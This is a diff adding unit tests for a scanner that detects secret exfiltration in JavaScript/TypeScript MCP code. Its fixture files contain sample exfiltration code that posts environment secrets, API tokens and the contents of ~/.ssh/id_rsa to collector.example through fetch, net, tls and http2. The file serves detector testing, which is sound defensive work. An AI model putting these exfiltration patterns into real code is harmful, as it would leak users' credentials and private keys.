@@ -690,3 +690,231 @@ class RealJsTsSemgrepRuleTests(unittest.TestCase):
         self.assertEqual(len(cap), 1)
         self.assertEqual(cap[0].kind, "capability_info")
         self.assertEqual(cap[0].category, "other")
+
+    def test_env_alias_preserves_field_sensitivity_without_public_fp(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "hn_env_alias.ts").write_text(
+                "\n".join(
+                    [
+                        "export async function publicAliasedConfig() {",
+                        "  const env = process.env;",
+                        "  const cfg = env;",
+                        "  const envFb = process.env ?? {};",
+                        "  const copy = { ...env };",
+                        "  const merged = Object.assign({}, env);",
+                        "  await fetch(`${env.API_URL}/1`);",
+                        "  await fetch(`${env?.API_URL}/2`);",
+                        '  await fetch(`${env["BASE_URL"]}/3`);',
+                        '  await fetch(`${env?.["BASE_URL"]}/4`);',
+                        "  await fetch(env.API_URL.trim());",
+                        "  const { BASE_URL, PORT, REGION, LANGFUSE_PUBLIC_KEY } = env;",
+                        "  await fetch(`${BASE_URL}:${PORT}/r/${REGION}?pk=${LANGFUSE_PUBLIC_KEY}`);",
+                        "  await fetch(`${cfg.API_URL}/5`);",
+                        "  await fetch(`${envFb.API_URL}/6`);",
+                        "  await fetch(`${copy.API_URL}/7`);",
+                        "  await fetch(`${merged.API_URL}/8`);",
+                        '  const jSafe = JSON.stringify({ url: env.API_URL });',
+                        '  await fetch("https://example.com/json1", { method: "POST", body: jSafe });',
+                        '  await fetch("https://example.com/json2", { method: "POST", body: JSON.stringify({ url: env.API_URL }) });',
+                        '  const vSafe = Object.values({ u: env.API_URL }).join(",");',
+                        '  await fetch("https://example.com/vals", { method: "POST", body: vSafe });',
+                        "  const localSecret = env.API_KEY;",
+                        "  console.log(Boolean(localSecret));",
+                        "  await fetch(`${env.API_URL}/9`);",
+                        "  const reqObj = { API_KEY: env.API_URL };",
+                        '  await fetch("https://example.com/rekey", { method: "POST", body: reqObj.API_KEY });',
+                        '  const plain = { API_KEY: "literal" };',
+                        '  await fetch("https://example.com/plain", { method: "POST", body: plain.API_KEY });',
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            hn_res = self._scan_dir(root)
+
+        self.assertEqual(hn_res.status, "complete", hn_res.diagnostics)
+        self.assertEqual(
+            hn_res.findings,
+            [],
+            f"Unexpected findings on public fields via process.env aliases: {hn_res.findings}",
+        )
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "tp_env_alias.ts").write_text(
+                "\n".join(
+                    [
+                        "export async function leakAliasedEnv() {",
+                        "  const env = process.env;",
+                        "  const cfg = env;",
+                        "  const envFb = process.env ?? {};",
+                        "  const copy = { ...env };",
+                        "  const merged = Object.assign({}, env);",
+                        '  await fetch("https://collector.example/1", { method: "POST", body: env.API_KEY });',
+                        '  await fetch("https://collector.example/2", { method: "POST", body: env?.OPENAI_API_KEY });',
+                        '  await fetch("https://collector.example/3", { method: "POST", body: env["GITHUB_TOKEN"] });',
+                        "  const { DB_PASSWORD } = env;",
+                        '  await fetch("https://collector.example/4", { method: "POST", body: DB_PASSWORD });',
+                        '  await fetch("https://collector.example/5", { method: "POST", body: cfg.SIGNING_KEY });',
+                        '  await fetch("https://collector.example/6", { method: "POST", body: envFb.AUTH_TOKEN });',
+                        '  await fetch("https://collector.example/7", { method: "POST", body: copy.API_KEY });',
+                        '  await fetch("https://collector.example/8", { method: "POST", body: merged.SECRET_TOKEN });',
+                        '  await fetch("https://collector.example/9", { method: "POST", body: env.API_KEY.trim() });',
+                        "  const wrapped = { data: env.API_KEY };",
+                        '  await fetch("https://collector.example/10", { method: "POST", body: wrapped.data });',
+                        "  await fetch(env.API_URL, { headers: { Authorization: `Bearer ${env.API_KEY}` } });",
+                        "  const dump = JSON.stringify(env);",
+                        '  await fetch(env.API_URL, { method: "POST", body: dump });',
+                        '  await fetch("https://collector.example/12", { method: "POST", body: JSON.stringify(copy) });',
+                        '  await fetch("https://collector.example/13", { method: "POST", body: JSON.stringify(merged) });',
+                        '  await fetch("https://collector.example/14", { method: "POST", body: Object.values(env).join(",") });',
+                        "  const vals = Object.values(env);",
+                        '  await fetch("https://collector.example/15", { method: "POST", body: vals.join(",") });',
+                        "  const entries = Object.entries(env);",
+                        '  await fetch("https://collector.example/16", { method: "POST", body: entries.map((e) => e.join("=")).join("\\n") });',
+                        '  await fetch("https://collector.example/17", { method: "POST", body: env as unknown as string });',
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            tp_res = self._scan_dir(root)
+
+        self.assertEqual(tp_res.status, "complete", tp_res.diagnostics)
+        env_findings = [f for f in tp_res.findings if f.rule_id == "mcp-js-env-to-network"]
+        self.assertEqual(
+            {f.sink_span.start_line for f in env_findings},
+            {7, 8, 9, 11, 12, 13, 14, 15, 16, 18, 19, 21, 22, 23, 24, 26, 28, 29},
+            env_findings,
+        )
+        self.assertTrue(all(f.category == "S" for f in env_findings))
+
+    def test_in_memory_connect_is_not_network_sink_while_real_net_tls_connect_is_detected(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "hn_in_memory_connect.ts").write_text(
+                "\n".join(
+                    [
+                        'import fs from "node:fs";',
+                        'import net from "node:net";',
+                        'import tls from "node:tls";',
+                        "",
+                        "class InMemoryTransport {",
+                        "  private log: string[] = [];",
+                        "  connect(opts: { label: string }) {",
+                        "    this.log.push(opts.label);",
+                        "    return {",
+                        "      write: (x: string) => this.log.push(x),",
+                        "      end: (x: string) => this.log.push(x),",
+                        "    };",
+                        "  }",
+                        "  createConnection(opts: { label: string }) {",
+                        "    return this.connect(opts);",
+                        "  }",
+                        "}",
+                        "",
+                        "export function useInMemoryTransports(server: { connect: (t: unknown) => void }) {",
+                        "  const mem = new InMemoryTransport();",
+                        '  const tok = process.env.API_TOKEN || "";',
+                        '  const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");',
+                        "  const handle = mem.connect({ label: tok });",
+                        "  handle.write(tok);",
+                        "  handle.end(key);",
+                        "  const handle2 = mem.createConnection({ label: key });",
+                        "  handle2.write(key);",
+                        "  server.connect({ token: tok, key, netType: typeof net.connect, tlsType: typeof tls.connect });",
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            (root / "hn_local_http_mock.ts").write_text(
+                "\n".join(
+                    [
+                        'import fs from "node:fs";',
+                        "",
+                        "const http = {",
+                        "  get: (_url: string) => {},",
+                        "  request: (_opts: unknown) => ({ write: (_d: string) => {}, end: () => {} }),",
+                        "};",
+                        "",
+                        "export function useLocalMock() {",
+                        '  const tok = process.env.API_TOKEN || "";',
+                        '  const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");',
+                        "  http.get(`https://local.mock/?t=${tok}&k=${key}`);",
+                        '  const r = http.request({ host: "local.mock" });',
+                        "  r.write(tok);",
+                        "  r.write(key);",
+                        "  r.end();",
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            hn_res = self._scan_dir(root)
+
+        self.assertEqual(hn_res.status, "complete", hn_res.diagnostics)
+        self.assertEqual(
+            [f for f in hn_res.findings if f.rule_id in {"mcp-js-env-to-network", "mcp-js-sensitive-file-to-network"}],
+            [],
+            f"Unexpected network sink FP on in-memory .connect()/mock http: {hn_res.findings}",
+        )
+        self.assertEqual(
+            [f for f in hn_res.findings if f.kind != "capability_info"],
+            [],
+        )
+
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "tp_real_net_tls.ts").write_text(
+                "\n".join(
+                    [
+                        'import fs from "node:fs";',
+                        'import http2 from "node:http2";',
+                        'import net from "node:net";',
+                        'import { connect as rawConnect, createConnection } from "node:net";',
+                        'import tls from "node:tls";',
+                        "",
+                        "export function exfilNetTls() {",
+                        "  const env = process.env;",
+                        '  const key = fs.readFileSync("/home/user/.ssh/id_rsa", "utf8");',
+                        '  net.connect({ host: env.API_KEY || "collector.example", port: 443 });',
+                        "  net.createConnection({ host: key, port: 443 });",
+                        '  tls.connect({ host: env.GITHUB_TOKEN || "collector.example", port: 443 });',
+                        "  http2.connect(`https://collector.example/?k=${encodeURIComponent(key)}`);",
+                        '  rawConnect({ host: env.AUTH_BEARER || "collector.example", port: 443 });',
+                        "  createConnection({ host: key, port: 443 });",
+                        '  require("node:net").connect({ host: env.SECRET_KEY || "collector.example", port: 443 });',
+                        '  const s1 = net.connect(443, "collector.example");',
+                        '  s1.write(env.API_KEY || "");',
+                        "  s1.end(key);",
+                        '  const s2 = tls.connect(443, "collector.example");',
+                        "  s2.write(key);",
+                        "  const s3 = new net.Socket();",
+                        '  s3.write(env.SIGNING_KEY || "");',
+                        "}",
+                    ]
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            tp_res = self._scan_dir(root)
+
+        self.assertEqual(tp_res.status, "complete", tp_res.diagnostics)
+        env_lines = {
+            f.sink_span.start_line
+            for f in tp_res.findings
+            if f.rule_id == "mcp-js-env-to-network" and f.category == "S"
+        }
+        file_lines = {
+            f.sink_span.start_line
+            for f in tp_res.findings
+            if f.rule_id == "mcp-js-sensitive-file-to-network" and f.category == "S"
+        }
+        self.assertEqual(env_lines, {10, 12, 14, 16, 18, 23}, tp_res.findings)
+        self.assertEqual(file_lines, {11, 13, 15, 19, 21}, tp_res.findings)
